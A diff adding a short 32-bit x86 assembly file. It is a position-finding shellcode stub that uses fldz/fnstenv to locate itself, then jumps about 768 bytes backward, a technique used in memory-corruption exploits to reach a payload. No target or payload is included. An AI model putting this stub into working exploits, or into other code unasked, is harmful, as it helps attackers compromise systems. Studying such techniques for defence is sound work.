@@ -1,0 +1,12 @@
+[BITS 32]
+global _start
+_start:
+fldz
+fnstenv [esp-12]
+pop ecx
+add cl, 10
+nop
+dec ch ; ecx -= 256
+dec ch ; ecx -= 256
+dec ch ; ecx -= 256
+jmp ecx
